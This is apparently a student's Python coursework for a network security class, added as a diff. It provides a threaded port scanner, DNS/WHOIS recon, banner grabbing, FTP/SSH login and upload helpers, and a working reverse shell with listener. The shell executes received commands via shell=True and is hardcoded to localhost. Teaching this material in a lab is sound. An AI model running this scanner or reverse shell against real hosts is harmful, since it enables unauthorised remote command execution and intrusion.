@@ -1,0 +1,291 @@
+"""
+Network Security Toolkit - Phase 2
+Course: 605346 - Information & Network Security Programming
+Student: Abdallah Haboob | ID: 202310365
+Instructor: Dr. Mohammad Arafah
+
+ETHICAL USE NOTICE:
+This tool is for educational purposes only.
+Must be tested in a local/sandboxed environment only.
+Testing against external systems is strictly prohibited.
+"""
+
+import socket
+import threading
+import os
+import subprocess
+import time
+import ftplib
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+
+# ── اختياري: نثبت المكتبات الخارجية إذا موجودة ──
+try:
+    import paramiko
+    HAS_SSH = True
+except ImportError:
+    HAS_SSH = False
+
+try:
+    import whois
+    HAS_WHOIS = True
+except ImportError:
+    HAS_WHOIS = False
+
+try:
+    import dns.resolver
+    HAS_DNS = True
+except ImportError:
+    HAS_DNS = False
+
+# ════════════════════════════════════════════
+# الجزء الأول: PORT SCANNER (من Phase 1)
+# ════════════════════════════════════════════
+
+def scan_port(host, port, results, lock):
+    """يفحص بورت واحد ويحفظ النتيجة"""
+    try:
+        s = socket.socket()
+        s.settimeout(1)
+        if s.connect_ex((host, port)) == 0:
+            with lock:
+                results.append(port)
+                print(f"  [OPEN]  {host}:{port}")
+        s.close()
+    except:
+        pass
+
+def run_scanner(host, ports):
+    """يشغل الـ scanner على كل البورتات بـ threads"""
+    print(f"\n[*] Scanning {host} ...")
+    results = []
+    lock = threading.Lock()
+    with ThreadPoolExecutor(max_workers=100) as ex:
+        for p in ports:
+            ex.submit(scan_port, host, p, results, lock)
+    print(f"[*] Open ports: {sorted(results)}")
+    return results
+
+# ════════════════════════════════════════════
+# الجزء الثاني: RECONNAISSANCE MODULE
+# ════════════════════════════════════════════
+
+def recon_dns(domain):
+    """DNS Enumeration: يسأل عن سجلات A, MX, NS"""
+    print(f"\n[RECON] DNS Enumeration → {domain}")
+    if not HAS_DNS:
+        print("  [!] dnspython غير مثبت. شغّل: pip install dnspython")
+        return
+    for rtype in ["A", "MX", "NS"]:
+        try:
+            answers = dns.resolver.resolve(domain, rtype, lifetime=5)
+            for r in answers:
+                print(f"  [{rtype}] {r}")
+        except Exception as e:
+            print(f"  [{rtype}] لا يوجد: {e}")
+
+def recon_whois(domain):
+    """WHOIS Lookup: يجيب معلومات تسجيل الدومين"""
+    print(f"\n[RECON] WHOIS → {domain}")
+    if not HAS_WHOIS:
+        print("  [!] python-whois غير مثبت. شغّل: pip install python-whois")
+        return
+    try:
+        w = whois.whois(domain)
+        print(f"  Registrar:    {w.registrar}")
+        print(f"  Created:      {w.creation_date}")
+        print(f"  Expires:      {w.expiration_date}")
+        print(f"  Name Servers: {w.name_servers}")
+    except Exception as e:
+        print(f"  [!] خطأ: {e}")
+
+def recon_banner(host, port):
+    """Banner Grabbing: يقرأ banner الخدمة من البورت"""
+    print(f"\n[RECON] Banner Grabbing → {host}:{port}")
+    try:
+        s = socket.socket()
+        s.settimeout(3)
+        s.connect((host, port))
+        if port in [80, 8080]:
+            s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
+        banner = s.recv(512).decode(errors="ignore").strip()
+        s.close()
+        print(f"  Banner: {banner[:200]}")
+    except Exception as e:
+        print(f"  [!] خطأ: {e}")
+
+# ════════════════════════════════════════════
+# الجزء الثالث: FTP + SSH MODULE
+# ════════════════════════════════════════════
+
+# ── حماية من Brute Force ──
+_attempts = {}
+_lock = threading.Lock()
+
+def rate_limit(ip, max_tries=5):
+    """يمنع أكثر من 5 محاولات لوجين في الدقيقة"""
+    with _lock:
+        now = time.time()
+        _attempts.setdefault(ip, [])
+        _attempts[ip] = [t for t in _attempts[ip] if now - t < 60]
+        _attempts[ip].append(now)
+        if len(_attempts[ip]) > max_tries:
+            print(f"  [!] Rate limit: {ip} محجوب مؤقتاً")
+            return False
+        return True
+
+def ftp_connect(host, user="anonymous", password=""):
+    """FTP: يتصل، يعرض الملفات، يرفع ملف تجريبي"""
+    print(f"\n[FTP] Connecting to {host} ...")
+    if not rate_limit(host):
+        return
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, 21, timeout=10)
+        ftp.login(user, password)
+        print(f"  [+] Login OK")
+
+        # عرض الملفات
+        print("  [*] Files:")
+        ftp.retrlines("LIST")
+
+        # رفع ملف تجريبي
+        test_file = "ftp_test.txt"
+        with open(test_file, "w") as f:
+            f.write("Phase 2 FTP test - Abdallah Haboob")
+        with open(test_file, "rb") as f:
+            ftp.storbinary(f"STOR {test_file}", f)
+        print(f"  [+] Uploaded: {test_file}")
+
+        ftp.quit()
+        os.remove(test_file)
+    except Exception as e:
+        print(f"  [!] FTP Error: {e}")
+
+def ssh_connect(host, user, password=None, key_path=None, command="whoami"):
+    """SSH: يتصل، ينفذ أمر، يرفع ملف عبر SFTP"""
+    print(f"\n[SSH] Connecting to {host} as {user} ...")
+    if not HAS_SSH:
+        print("  [!] paramiko غير مثبت. شغّل: pip install paramiko")
+        return
+    if not rate_limit(host):
+        return
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        # Key-based أو Password
+        if key_path:
+            key = paramiko.RSAKey.from_private_key_file(key_path)
+            client.connect(host, username=user, pkey=key, timeout=10)
+            print("  [+] Connected (key-based auth)")
+        else:
+            client.connect(host, username=user, password=password, timeout=10)
+            print("  [+] Connected (password auth)")
+
+        # تنفيذ أمر
+        _, stdout, stderr = client.exec_command(command)
+        print(f"  [CMD] {command}")
+        print(f"  [OUT] {stdout.read().decode().strip()}")
+
+        # SFTP: رفع ملف
+        sftp = client.open_sftp()
+        test_file = "sftp_test.txt"
+        with open(test_file, "w") as f:
+            f.write("Phase 2 SFTP test - Abdallah Haboob")
+        sftp.put(test_file, f"/tmp/{test_file}")
+        print(f"  [+] SFTP Upload OK → /tmp/{test_file}")
+        sftp.close()
+        os.remove(test_file)
+
+        client.close()
+    except Exception as e:
+        print(f"  [!] SSH Error: {e}")
+
+# ════════════════════════════════════════════
+# الجزء الرابع: EDUCATIONAL PAYLOAD
+# ════════════════════════════════════════════
+"""
+ETHICAL NOTICE:
+Reverse shell connects ONLY to 127.0.0.1 (localhost).
+This is a sandboxed educational demonstration only.
+Connecting to external systems is strictly prohibited.
+"""
+
+HOST = "127.0.0.1"  # HARDCODED - DO NOT CHANGE
+
+def listener(port):
+    """Listener: يستقبل الاتصال من الـ reverse shell"""
+    print(f"\n[PAYLOAD] Listener started on {HOST}:{port}")
+    srv = socket.socket()
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind((HOST, port))
+    srv.listen(1)
+    srv.settimeout(10)
+    try:
+        conn, addr = srv.accept()
+        print(f"  [+] Connection from {addr}")
+        # أرسل أمر تجريبي واحد للـ demo
+        conn.send(b"whoami\n")
+        output = conn.recv(1024).decode(errors="ignore")
+        print(f"  [OUT] {output.strip()}")
+        conn.close()
+    except socket.timeout:
+        print("  [!] Listener timed out")
+    srv.close()
+
+def reverse_shell(port):
+    """Reverse Shell: يتصل بالـ listener وينفذ الأوامر"""
+    time.sleep(1)  # انتظر حتى الـ listener يبدأ
+    try:
+        s = socket.socket()
+        s.connect((HOST, port))
+        print(f"  [PAYLOAD] Shell connected to {HOST}:{port}")
+        cmd = s.recv(1024).decode(errors="ignore").strip()
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        s.send((result.stdout + result.stderr).encode())
+        s.close()
+    except Exception as e:
+        print(f"  [!] Shell error: {e}")
+
+def run_payload_demo(port=4444):
+    """يشغل الـ listener والـ shell مع بعض على localhost"""
+    print("\n[*] Educational Payload Demo (localhost only)")
+    print("[*] ⚠  SANDBOXED - 127.0.0.1 ONLY")
+    t1 = threading.Thread(target=listener, args=(port,), daemon=True)
+    t2 = threading.Thread(target=reverse_shell, args=(port,))
+    t1.start()
+    t2.start()
+    t2.join()
+    print("[*] Payload demo done.")
+
+# ════════════════════════════════════════════
+# MAIN
+# ════════════════════════════════════════════
+
+if __name__ == "__main__":
+    print("=" * 50)
+    print("  Network Security Toolkit - Phase 2")
+    print("  Student: Abdallah Haboob | ID: 202310365")
+    print("  ⚠  Authorized Lab Use Only")
+    print("=" * 50)
+
+    TARGET = "127.0.0.1"   # ← غيّر هاد لأي target تبعك في اللاب
+    DOMAIN = "google.com"   # ← غيّر هاد للدومين اللي بدك تعمل عليه recon
+
+    # 1. Port Scanner
+    open_ports = run_scanner(TARGET, range(1, 1025))
+
+    # 2. Recon
+    recon_dns(DOMAIN)
+    recon_whois(DOMAIN)
+    recon_banner(TARGET, 80)
+
+    # 3. FTP (شغّل FTP server محلي أولاً مثل: python -m pyftpdlib -p 21)
+    # ftp_connect("127.0.0.1", "user", "pass")
+
+    # 4. SSH (شغّل SSH server محلي أولاً)
+    # ssh_connect("127.0.0.1", "user", password="pass", command="ls /tmp")
+
+    # 5. Payload Demo
+    run_payload_demo(port=4444)
